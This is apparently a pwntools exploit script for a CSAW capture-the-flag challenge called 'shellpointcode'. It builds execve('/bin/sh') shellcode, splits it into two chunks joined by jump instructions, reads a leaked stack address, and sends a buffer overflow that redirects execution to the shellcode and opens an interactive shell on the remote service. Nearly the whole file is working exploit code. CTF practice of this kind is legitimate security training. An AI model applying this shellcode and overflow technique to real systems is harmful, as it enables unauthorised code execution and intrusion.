#!/usr/bin/python
from pwn import *
import struct

#context.log_level = 'debug'
context.terminal="/bin/zsh"

# shellcode = """xor eax, eax
# mov rbx, 0xFF978CD091969DD1
# neg rbx
# push rbx
# push rsp
# pop rdi
# cdq
# push rdx
# push rdi
# push rsp
# pop rsi
# mov al, 0x3b
# syscall""".split('\n')

shellcode = """mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
xor eax, eax
cdq
xor esi, esi
push rsp
pop rdi
mov al, 0x3b
syscall""".split('\n')


def asm64(cmd):
    return asm(cmd, arch = 'amd64', os = 'linux')


def jmp(n):
    return '\xeb' + struct.pack('<I', 211 - 2)


def split_code():
    l = 15 - 4
    b = ''
    nodes = []
    for i in shellcode:
        b += asm64(i)
        if len(b) >= l:
            b += jmp(16 + (l - len(b)))
            nodes.append(b)
            b = ''
    return nodes



if True:
    conn = remote('pwn.chal.csaw.io', 9005)
    #conn = process('./shellpointcode')
    #pause()
    # gdb.attach(conn)

    h2, h1 = split_code()
    
    print conn.recvuntil(': '), h2
    conn.sendline(h2)
    
    print conn.recvuntil(': '), h1
    conn.sendline(h1)
    
    print conn.recvuntil('next: ')
    a = conn.recvline().strip()
    print a
    
    adj = int(a, 16) + 40
    addr = struct.pack('<Q', adj)
    print 'addr', hex(adj), len(addr)
    
    print conn.recvuntil('?'), addr
    conn.sendline('A' * 11 + addr)
    
    conn.interactive()





